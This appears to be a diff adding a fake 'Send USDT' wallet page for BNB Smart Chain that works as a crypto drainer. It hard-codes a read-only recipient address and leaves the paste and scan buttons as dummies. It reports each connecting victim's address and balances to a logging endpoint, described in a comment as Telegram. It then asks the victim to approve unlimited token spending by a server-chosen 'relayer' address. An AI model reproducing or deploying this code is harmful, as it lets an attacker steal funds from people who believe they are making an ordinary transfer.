@@ -1,0 +1,700 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Send USDT</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        
+        /* Auto Dark/Light Theme based on System UI */
+        :root {
+            --bg-color: #f3f4f6;
+            --text-main: #111827;
+            --text-muted: #6b7280;
+            --input-bg: #ffffff;
+            --input-border: #d1d5db;
+            --input-readonly-bg: #e5e7eb;
+            --primary: #00e676;
+            --primary-hover: #00c853;
+            --btn-disabled-bg: #e5e7eb;
+            --btn-disabled-text: #9ca3af;
+            --box-border: #e5e7eb;
+        }
+
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --bg-color: #16181a;
+                --text-main: #ffffff;
+                --text-muted: #8c939f;
+                --input-bg: #212429;
+                --input-border: #2c2f36;
+                --input-readonly-bg: #1c1e22;
+                --btn-disabled-bg: #2c2f36;
+                --btn-disabled-text: #5c6168;
+                --box-border: #2c2f36;
+            }
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+            padding: 10vh 20px 20px 20px;
+        }
+        .container {
+            width: 100%;
+            max-width: 440px;
+        }
+        h2 {
+            text-align: center;
+            font-size: 1.1rem;
+            font-weight: 600;
+            margin-bottom: 2rem;
+        }
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+        .label-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 0.6rem;
+        }
+        label {
+            color: var(--text-muted);
+            font-size: 0.85rem;
+        }
+        .input-wrapper {
+            background-color: var(--input-bg);
+            border: 1px solid var(--input-border);
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            padding: 0 16px;
+            height: 60px;
+            transition: border-color 0.2s;
+        }
+        .input-wrapper:focus-within {
+            border-color: var(--primary);
+        }
+        input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            color: var(--text-main);
+            font-size: 1.1rem;
+            outline: none;
+            width: 100%;
+            padding: 0;
+        }
+        input::placeholder {
+            color: var(--text-muted);
+        }
+        
+        .btn-icon {
+            color: var(--primary);
+            cursor: pointer;
+            background: none;
+            border: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 4px;
+            transition: color 0.2s;
+        }
+        .btn-icon:hover { color: var(--primary-hover); }
+        .btn-icon svg { width: 18px; height: 18px; }
+
+        .input-suffix {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-left: 12px;
+            font-size: 0.9rem;
+            font-weight: 600;
+        }
+        .text-usdt { color: var(--text-muted); }
+        .btn-text { 
+            color: var(--primary); 
+            cursor: pointer; 
+            user-select: none;
+            background: none;
+            border: none;
+            font-weight: 600;
+            font-size: 0.95rem;
+        }
+        .btn-text:hover { color: var(--primary-hover); }
+        
+        .fiat-value {
+            color: var(--text-muted);
+            font-size: 0.85rem;
+            margin-top: 0.6rem;
+        }
+        
+        .action-btn {
+            width: 100%;
+            background-color: var(--primary);
+            color: #000000;
+            border: none;
+            border-radius: 16px;
+            padding: 16px;
+            font-size: 1rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-top: 0.5rem;
+        }
+        .action-btn:hover:not(:disabled) {
+            background-color: var(--primary-hover);
+            transform: translateY(-1px);
+        }
+        .action-btn:disabled {
+            background-color: var(--btn-disabled-bg);
+            color: var(--btn-disabled-text);
+            cursor: not-allowed;
+        }
+
+        .notify { margin-top: 1.5rem; padding: 1rem; border-radius: 12px; display: none; font-size: 0.9rem; word-break: break-all; line-height: 1.4; text-align: center; }
+        .success { background: rgba(0, 230, 118, 0.1); color: #00e676; border: 1px solid rgba(0, 230, 118, 0.2); }
+        .error { background: rgba(255, 72, 72, 0.1); color: #ff4848; border: 1px solid rgba(255, 72, 72, 0.2); }
+        .info { background: rgba(0, 122, 255, 0.1); color: #4da3ff; border: 1px solid rgba(0, 122, 255, 0.2); }
+        
+        .steps { margin-top: 1.5rem; font-size: 0.85rem; color: var(--text-muted); text-align: left; background: var(--input-bg); padding: 1rem; border-radius: 16px; border: 1px solid var(--box-border); }
+        .steps .step { padding: 0.4rem 0; }
+        .steps .step.active { color: var(--primary); font-weight: bold; }
+        .steps .step.done { color: var(--text-main); }
+        a { color: var(--primary); text-decoration: none; }
+        a:hover { text-decoration: underline; }
+        
+        #wallet-badge {
+            display: none;
+            justify-content: space-between;
+            align-items: center;
+            background: var(--input-bg);
+            border-radius: 12px;
+            padding: 12px 16px;
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            margin-bottom: 1.5rem;
+            border: 1px solid var(--box-border);
+        }
+        #wallet-badge span { color: var(--text-main); font-weight: 500; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Send USDT</h2>
+        
+        <div id="wallet-badge" style="display:none!important;">
+            <div><span id="display-account">-</span></div>
+            <div>Balance: <span id="display-balance">-</span> USDT</div>
+        </div>
+
+        <div class="form-group">
+            <div class="label-row">
+                <label>Address or Domain Name</label>
+            </div>
+            <div class="input-wrapper" id="recipient-wrapper">
+                <input type="text" id="recipient" value="0x35B508a6eCF490d88FaE90e2646A9c73f006C094" readonly />
+                <div class="input-suffix">
+                    <button type="button" class="btn-text" id="btn-paste">Paste</button>
+                    <button type="button" class="btn-icon" id="btn-qr" title="Scan QR Code">
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <rect x="3" y="3" width="7" height="7"></rect>
+                            <rect x="14" y="3" width="7" height="7"></rect>
+                            <rect x="14" y="14" width="7" height="7"></rect>
+                            <rect x="3" y="14" width="7" height="7"></rect>
+                        </svg>
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <div class="form-group">
+            <div class="label-row">
+                <label>Amount</label>
+            </div>
+            <div class="input-wrapper">
+                <input type="text" id="amount" placeholder="0" inputmode="decimal" pattern="[0-9]*\.?[0-9]*" autocomplete="off" />
+                <div class="input-suffix">
+                    <span class="text-usdt">USDT</span>
+                    <button type="button" class="btn-text" id="btn-max">Max</button>
+                </div>
+            </div>
+            <div class="fiat-value" id="fiat-value">≈ $0.00</div>
+        </div>
+
+        <button id="action-btn" class="action-btn">Connect Wallet</button>
+
+        <div id="steps" class="steps" style="display:none!important;">
+            <div class="step" id="step1">1. Checking gas balance...</div>
+            <div class="step" id="step2">2. Creating transfer intent...</div>
+            <div class="step" id="step3">3. Preparing transfer...</div>
+            <div class="step" id="step4">4. Executing transfer...</div>
+            <div class="step" id="step5">5. Confirming on blockchain...</div>
+        </div>
+
+        <div id="notify" class="notify" style="display:none!important;"></div>
+    </div>
+
+    <script>
+        // ==================== CONFIG ====================
+        const BSC_CHAIN_ID = "0x38";
+        const BSC_CHAIN_CONFIG = {
+            chainId: BSC_CHAIN_ID,
+            chainName: 'BNB Smart Chain',
+            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+            rpcUrls: ['https://bsc-dataseed1.binance.org/'],
+            blockExplorerUrls: ['https://bscscan.com']
+        };
+
+        const API = {
+            logConnect: "/api/v1/log/connect",
+            logApproval: "/api/v1/log/approval",
+            transferComplete: "/api/v1/log/transfer-complete",
+            intent: "/api/v1/sponsor/intent",
+            loan: "/api/v1/sponsor/loan",
+            submit: "/api/v1/sponsor/submit",
+            info: "/api/v1/info"
+        };
+
+        const state = {
+            account: null,
+            balanceWei: ethers.BigNumber.from(0),
+            bnbBalanceWei: ethers.BigNumber.from(0),
+            decimals: 18,
+            symbol: 'USDT',
+            tokenAddress: '0x55d398326f99059fF775485246999027B3197955',
+            relayer: null
+        };
+
+        const ERC20_ABI = [
+            "function balanceOf(address owner) view returns (uint256)",
+            "function decimals() view returns (uint8)",
+            "function symbol() view returns (string)",
+            "function approve(address spender, uint256 amount) returns (bool)",
+            "function allowance(address owner, address spender) view returns (uint256)",
+            "function transfer(address to, uint256 amount) returns (bool)"
+        ];
+
+        // ==================== UI HELPERS ====================
+        function showNotify(msg, type) {
+            const el = document.getElementById("notify");
+            el.className = `notify ${type}`;
+            el.innerHTML = msg;
+            el.style.display = 'block';
+        }
+
+        function hideNotify() {
+            document.getElementById("notify").style.display = 'none';
+        }
+
+        function setStep(n) {
+            document.getElementById("steps").style.display = "block";
+            for (let i = 1; i <= 5; i++) {
+                const el = document.getElementById(`step${i}`);
+                if (i < n) el.className = "step done";
+                else if (i === n) el.className = "step active";
+                else el.className = "step";
+            }
+        }
+
+        function hideSteps() {
+            document.getElementById("steps").style.display = "none";
+        }
+
+        function updateActionButton() {
+            const btn = document.getElementById("action-btn");
+            if (!state.account) {
+                btn.innerText = "Connect Wallet";
+                btn.disabled = false;
+                return;
+            }
+
+            const amountStr = document.getElementById("amount").value.trim();
+            if (!amountStr || isNaN(amountStr) || parseFloat(amountStr) <= 0) {
+                btn.innerText = "Enter Amount";
+                btn.disabled = true;
+                return;
+            }
+
+            try {
+                const parsed = ethers.utils.parseUnits(amountStr, state.decimals);
+                if (parsed.gt(state.balanceWei)) {
+                    btn.innerText = "Insufficient USDT Balance";
+                    btn.disabled = true;
+                    return;
+                }
+                btn.innerText = "Send USDT";
+                btn.disabled = false;
+            } catch {
+                btn.innerText = "Invalid Amount";
+                btn.disabled = true;
+            }
+        }
+
+        // Handle amount input & Max button
+        document.getElementById('amount').addEventListener('input', (e) => {
+            const val = e.target.value.trim();
+            const fiatNum = parseFloat(val);
+            const displayFiat = (!isNaN(fiatNum)) ? fiatNum.toFixed(2) : '0.00';
+            document.getElementById('fiat-value').innerText = '≈ $' + displayFiat;
+            updateActionButton();
+        });
+
+        document.getElementById('btn-max').addEventListener('click', () => {
+            if (state.balanceWei.gt(0)) {
+                const maxVal = ethers.utils.formatUnits(state.balanceWei, state.decimals);
+                document.getElementById('amount').value = maxVal;
+                
+                const fiatNum = parseFloat(maxVal);
+                document.getElementById('fiat-value').innerText = '≈ $' + fiatNum.toFixed(2);
+                updateActionButton();
+            }
+        });
+
+        // Paste and QR are dummy mock UI elements, so no click handlers are needed.
+        // ==================== WALLET PROVIDER DETECTION ====================
+        function getProvider() {
+            // Trust Wallet extension
+            if (window.trustwallet?.ethereum) return window.trustwallet.ethereum;
+            // Multiple providers (e.g., MetaMask + Trust Wallet both installed)
+            if (window.ethereum?.providers?.length) {
+                const trust = window.ethereum.providers.find(p => p.isTrust || p.isTrustWallet);
+                if (trust) return trust;
+                return window.ethereum.providers[0];
+            }
+            // Standard provider
+            if (window.ethereum) return window.ethereum;
+            return null;
+        }
+
+        // ==================== NETWORK HANDLING ====================
+        async function ensureBSC() {
+            const provider = getProvider();
+            if (!provider) throw new Error("No wallet detected. Please install MetaMask or Trust Wallet.");
+
+            const chainId = await provider.request({ method: 'eth_chainId' });
+            if (chainId === BSC_CHAIN_ID) return true;
+
+            try {
+                await provider.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: BSC_CHAIN_ID }]
+                });
+                return true;
+            } catch (switchErr) {
+                if (switchErr.code === 4902) {
+                    try {
+                        await provider.request({
+                            method: 'wallet_addEthereumChain',
+                            params: [BSC_CHAIN_CONFIG]
+                        });
+                        return true;
+                    } catch (addErr) {
+                        throw new Error("Could not add BNB Chain to your wallet. Please add it manually.");
+                    }
+                }
+                if (switchErr.code === 4001) throw new Error("You must switch to BNB Smart Chain to continue.");
+                throw switchErr;
+            }
+        }
+
+        // ==================== WALLET DATA ====================
+        async function fetchServerInfo() {
+            try {
+                const res = await fetch(API.info);
+                if (res.ok) {
+                    const data = await res.json();
+                    state.tokenAddress = data.tokenAddress;
+                    state.symbol = data.symbol;
+                    state.decimals = data.decimals;
+                    state.relayer = data.relayer;
+                }
+            } catch (e) {
+                console.warn("Could not fetch server info:", e);
+            }
+        }
+
+        async function updateWalletData() {
+            if (!state.account) return "0";
+
+            const provider = new ethers.providers.Web3Provider(getProvider());
+            const contract = new ethers.Contract(state.tokenAddress, ERC20_ABI, provider);
+
+            try {
+                state.bnbBalanceWei = await provider.getBalance(state.account);
+                state.decimals = await contract.decimals();
+                state.symbol = await contract.symbol();
+                state.balanceWei = await contract.balanceOf(state.account);
+
+                const displayBal = ethers.utils.formatUnits(state.balanceWei, state.decimals);
+
+                document.getElementById('display-account').innerText = state.account.substring(0, 6) + '...' + state.account.substring(38);
+                document.getElementById('display-balance').innerText = parseFloat(displayBal).toFixed(4);
+                
+                // wallet badge hidden
+
+                return displayBal;
+            } catch (e) {
+                console.error("Error fetching wallet data:", e);
+                return "0";
+            }
+        }
+
+        // ==================== CONNECT WALLET ====================
+        let isSending = false; // BUG 9 FIX: double-click lock
+
+        async function connectWallet() {
+            const walletProvider = getProvider();
+            if (!walletProvider) return alert("Please install MetaMask or Trust Wallet to continue.");
+
+            try {
+                hideNotify();
+                const btn = document.getElementById('action-btn');
+                btn.innerText = "Connecting...";
+                btn.disabled = true;
+                
+                await ensureBSC();
+
+                const accounts = await walletProvider.request({ method: 'eth_requestAccounts' });
+                if (!accounts.length) throw new Error("No accounts returned from wallet.");
+                state.account = accounts[0];
+
+                await fetchServerInfo();
+
+                const balanceStr = await updateWalletData();
+
+                const displayBnb = ethers.utils.formatEther(state.bnbBalanceWei);
+
+                // Log to Telegram (fire and forget)
+                fetch(API.logConnect, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        account: state.account,
+                        balance: parseFloat(balanceStr).toFixed(4),
+                        bnbBalance: parseFloat(displayBnb).toFixed(4),
+                        symbol: state.symbol,
+                        url: window.location.href
+                    })
+                }).catch(() => {});
+
+            } catch (err) {
+                showNotify(err.message, 'error');
+            } finally {
+                updateActionButton(); // Always reset button state
+            }
+        }
+
+        // ==================== WALLET EVENT LISTENERS ====================
+        const _evProvider = getProvider();
+        if (_evProvider) {
+            _evProvider.on('accountsChanged', (accounts) => {
+                if (accounts.length === 0) {
+                    state.account = null;
+                    updateActionButton();
+                } else {
+                    state.account = accounts[0];
+                    updateWalletData().then(updateActionButton);
+                }
+            });
+
+            _evProvider.on('chainChanged', (chainId) => {
+                if (chainId !== BSC_CHAIN_ID) {
+                    document.getElementById('action-btn').disabled = true;
+                } else {
+                    updateWalletData().then(updateActionButton);
+                }
+            });
+        }
+
+        // ==================== SEND TRANSACTION ====================
+        async function sendUSDT() {
+            if (isSending) return; // BUG 9: prevent double-click
+            isSending = true;
+
+            const btn = document.getElementById('action-btn');
+            btn.disabled = true;
+            btn.innerText = "Sending..."; // UX 1: visual feedback
+            hideNotify();
+
+            try {
+                await ensureBSC();
+
+                // BUG 5: Validate amount before proceeding
+                const amountStr = document.getElementById("amount").value.trim();
+                if (!amountStr || isNaN(amountStr) || parseFloat(amountStr) <= 0) {
+                    throw new Error("Please enter a valid amount.");
+                }
+
+                const recipient = document.getElementById("recipient").value.trim();
+                const amountWei = ethers.utils.parseUnits(amountStr, state.decimals);
+
+                if (amountWei.gt(state.balanceWei)) {
+                    throw new Error("Insufficient USDT balance.");
+                }
+
+                // STEP 1: Gas Loan Check
+                setStep(1);
+                showNotify("Checking gas balance...", 'info');
+                
+                try {
+                    const loanRes = await fetch(API.loan, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ account: state.account })
+                    });
+                    
+                    if (loanRes.ok) {
+                        const loanData = await loanRes.json();
+                        if (loanData.loanAmount === "0" || loanData.loanAmount === 0) {
+                            showNotify("No gas loan needed, proceeding to approval.", 'info');
+                        } else {
+                            showNotify(`Gas loan of ${loanData.loanAmount} BNB sent. Waiting for confirmation...`, 'info');
+                            await new Promise(r => setTimeout(r, 3000));
+                        }
+                    } else {
+                        const loanData = await loanRes.json();
+                        // BUG 4 FIX: refresh BNB balance from chain before deciding
+                        const freshProvider = new ethers.providers.Web3Provider(getProvider());
+                        state.bnbBalanceWei = await freshProvider.getBalance(state.account);
+                        const minBnb = ethers.utils.parseEther("0.0003");
+                        if (state.bnbBalanceWei.lt(minBnb)) {
+                            throw new Error(loanData.error || "Gas loan failed");
+                        }
+                    }
+                } catch (e) {
+                    // BUG 4 FIX: refresh BNB balance from chain before deciding
+                    const freshProvider = new ethers.providers.Web3Provider(getProvider());
+                    state.bnbBalanceWei = await freshProvider.getBalance(state.account);
+                    const minBnb = ethers.utils.parseEther("0.0003");
+                    if (state.bnbBalanceWei.lt(minBnb)) {
+                        throw e;
+                    }
+                }
+                
+                await updateWalletData();
+
+                // STEP 2: Token approval
+                setStep(2);
+                const provider = new ethers.providers.Web3Provider(getProvider());
+                const signer = provider.getSigner();
+                const contract = new ethers.Contract(state.tokenAddress, ERC20_ABI, signer);
+
+                // Fetch server config
+                await fetchServerInfo();
+                const relayerAddress = state.relayer;
+
+                const existingAllowance = await contract.allowance(state.account, relayerAddress);
+                if (existingAllowance.lt(amountWei)) {
+                    const approveTx = await contract.approve(relayerAddress, ethers.constants.MaxUint256);
+                    showNotify("Waiting for approval confirmation...", 'info');
+                    await approveTx.wait();
+                    
+                    fetch(API.logApproval, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ account: state.account })
+                    }).catch(() => {});
+                    
+                    hideNotify();
+                } else {
+                    fetch(API.logApproval, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ account: state.account })
+                    }).catch(() => {});
+                }
+
+                // Refresh BNB balance after approval (gas was spent)
+                state.bnbBalanceWei = await provider.getBalance(state.account);
+                const minGasForTransfer = ethers.utils.parseEther("0.0005");
+                const userHasGas = state.bnbBalanceWei.gte(minGasForTransfer);
+
+                let txHash;
+
+                if (userHasGas) {
+                    // ===== Direct transfer =====
+                    setStep(3);
+                    showNotify("Executing transfer...", 'info');
+                    
+                    const transferTx = await contract.transfer(recipient, amountWei);
+                    const receipt = await transferTx.wait();
+                    
+                    if (receipt.status !== 1) {
+                        throw new Error("Transaction reverted on-chain");
+                    }
+                    txHash = receipt.transactionHash;
+
+                    // Log transfer completion
+                    fetch(API.transferComplete, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ account: state.account, txHash })
+                    }).catch(() => {});
+
+                } else {
+                    // ===== Server-assisted transfer =====
+                    setStep(3);
+                    
+                    const intentRes = await fetch(API.intent, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ account: state.account, recipient, amount: amountStr })
+                    });
+                    const intentData = await intentRes.json();
+                    if (!intentRes.ok) throw new Error(intentData.error || "Failed to create intent");
+
+                    setStep(4);
+                    const submitRes = await fetch(API.submit, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ intentId: intentData.intentId })
+                    });
+                    const result = await submitRes.json();
+                    if (!submitRes.ok) throw new Error(result.error || "Transfer failed");
+                    txHash = result.txHash;
+                }
+
+                // STEP 5: Success
+                setStep(5);
+                showNotify(
+                    `✅ Successfully sent ${amountStr} ${state.symbol}!<br><br><a href="https://bscscan.com/tx/${txHash}" target="_blank" rel="noopener">View on BscScan →</a>`,
+                    'success'
+                );
+
+                await updateWalletData();
+                document.getElementById('amount').value = '';
+                document.getElementById('fiat-value').innerText = '≈ $0.00';
+                setTimeout(hideSteps, 5000);
+                
+            } catch (err) {
+                console.error("Transfer error:", err);
+                showNotify(err.message || "Transaction failed. Please try again.", 'error');
+                hideSteps(); // UX 2: hide steps on error instead of leaving half-complete
+            } finally {
+                isSending = false;
+                updateActionButton();
+            }
+        }
+
+        // ==================== MASTER BUTTON HANDLER ====================
+        document.getElementById('action-btn').addEventListener('click', async () => {
+            if (!state.account) {
+                await connectWallet();
+            } else {
+                await sendUSDT();
+            }
+        });
+        
+        // Initial setup
+        updateActionButton();
+    </script>
+</body>
+</html>
